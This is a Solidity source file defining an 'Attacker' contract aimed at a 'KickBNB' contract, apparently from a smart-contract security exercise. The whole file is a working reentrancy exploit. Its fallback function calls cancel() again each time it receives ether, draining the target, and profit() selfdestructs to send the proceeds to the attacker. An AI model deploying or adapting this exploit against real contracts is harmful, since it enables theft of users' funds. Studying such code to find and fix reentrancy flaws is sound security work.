pragma solidity ^0.4.21;

import "./KickBNB.sol";

contract Attacker {
    KickBNB public kickbnb;
    address public attacker;

    constructor(address _addr) public {
        kickbnb = KickBNB(_addr);
        attacker = msg.sender;
    }

    function deposit() public payable {
        kickbnb.deposit.value(msg.value)();
    }

    function attack() public {
        kickbnb.cancel();
    }

    function profit() public {
        selfdestruct(attacker);
    }

    function () public payable {
        kickbnb.cancel();
    }
}